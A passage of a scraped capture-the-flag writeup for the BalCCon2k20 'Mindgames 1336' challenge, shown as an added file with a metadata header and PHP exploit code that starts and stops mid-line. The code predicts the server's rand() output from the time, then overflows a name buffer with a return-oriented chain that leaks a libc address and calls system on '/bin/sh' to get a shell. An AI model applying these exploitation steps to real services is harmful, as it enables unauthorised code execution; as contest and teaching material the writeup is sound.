@@ -1,0 +1,13 @@
+---
+SOURCE: livesearch
+URL: https://ctftime.org/writeup/24043
+CHALLENGE: CTFtime.org / BalCCon2k20 CTF / Mindgames 1336 / Writeup
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: other
+DIFFICULTY: Unknown
+PROTECTIONS: None
+KEY_FUNCTIONS: printf, system, read
+KEY_TECHNIQUE: Writeup for CTFtime.org / BalCCon2k20 CTF / Mindgames 1336 / Writeup — other exploitation technique.
+---
+ld play a game of the mind!"); $t->expect("> "); $ffi = FFI::load("rand.h"); printf("[+] Done in %f seconds\n", microtime(true) - $time); printf("\n"); $time = strtotime($date); $ffi->srand($time); $ffi->rand(); // player $ffi->rand(); // score $t->expectLine("What do you want to do?"); $t->expectLine(" 1) Show Highscore"); $t->expectLine(" 2) Play the game"); $t->expectLine(" 3) Exit"); $t->expect("> "); $t->write("2\n"); $t->expectLine("Can you guess my numbers?"); $t->expect("> "); for($i = 0; $i < 50; $i++) { $guess = $ffi->rand(); $t->write("$guess\n"); } for($i = 0; $i < 50; $i++) { $t->expectLine("You were lucky this time!"); $t->expect(">"); } $t->write("-1\n"); $t->expectLine("Game over!"); $t->expectLine("New Highscore! Amazing!"); /* Leak */ $payload  = str_repeat("x", 0x110); $payload .= pack("Q", 0xdeadbeef); // rbp $payload .= pack("Q*", POPRDI, 0x00403fe8, PUTS, 0x00401336, // stage 2 ); // rip $t->expect("Give me your name: "); $t->write($payload); $leak = $t->readLine(); $leak = str_pad(substr($leak, 0, 8), 8, "\x00"); $addr = unpack("Q", $leak)[1]; $libc  = $addr & ~0xFFF; $libc -= 0x23000; // vvv leak vvv // /* stage 2 */ // // $payload  = str_repeat("x", 0x110); // $payload .= pack("Q", 0xdeadbeef); // rbp // $payload .= pack("Q*", // 	POPRDI, $libc + 0x18, // 	PUTS, // 	0x00401336, // stage 2 // ); // rip // // $t->expect("Give me your name: "); // $t->write($payload); // // $leak = $t->readLine(); // $leak = str_pad(substr($leak, 0, 8), 8, "\x00"); // $entry = unpack("Q", $leak)[1]; // printf("Entry : %X\n", $entry); // // /* stage 3 */ // // $payload  = str_repeat("x", 0x110); // $payload .= pack("Q", 0xdeadbeef); // rbp // $payload .= pack("Q*", // 	$libc + $entry, // ); // rip // // $t->expect("Give me your name: "); // $t->write($payload); $payload  = str_repeat("x", 0x110); $payload .= pack("Q", 0xdeadbeef); // rbp $payload .= pack("Q*", POPRDI, $libc + BINSH, $libc + SYSTEM, -1, ); // rip $t->expect("Give me your name: "); $t->write($payl
